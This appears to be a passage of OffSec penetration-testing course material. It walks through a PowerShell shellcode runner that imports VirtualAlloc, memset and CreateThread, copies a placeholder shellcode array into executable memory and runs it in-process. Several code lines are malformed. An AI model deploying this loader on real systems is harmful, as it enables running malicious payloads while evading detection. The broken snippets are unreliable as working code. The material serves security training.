# OffSec

The script starts by importing VirtualAlloc581 CreateThread582 from kernel32.dll as we use memset from msvcrt.dll. These functions allow us to allocate memory, create an execution, and write binary data to the allocated memory, respectively. Once again, notice that we are allocating the memory and executing a new thread in the current process (powershell.exe), rather than a remote one.

```
[DllImport("kernel32.dll")
public static extern IntPtr VirtualAlloc(IntPtr lAddress, uint dwSize, uint
flAllocationType, int flProtect);
```

```
[DllImport("kernel32.dll")
public static extern IntPtr CreateThread(IntPtr lpAddress, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

```
[DllImport("msvcrt.dll")
public static extern IntPtr memset(IntPtr dest, IntPtr src, int count);
```

The main logic starts by allocating a block of memory using VirtualAlloc, which takes each byte of the payload stored in the sc array and writes it to our newly-allocated memory block using memset.

```
[[]]$sc = <place your shell code here>

$size = 0x1000;

if ($sc.length -gt 0x1000) {$size = $sc.Length};

$x = $WinFunc:VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le($sc.length-1);$i++){$WinFunc:memset([IntPtr]$x.ToInt32($i),$sc[$i], 1)};
```

As a final step, our memory payload is executed through the script using the CreateThread API.

```
$WinFunc:CreateThread(0,0,$x,0);for { Start-sleep 60 };
```
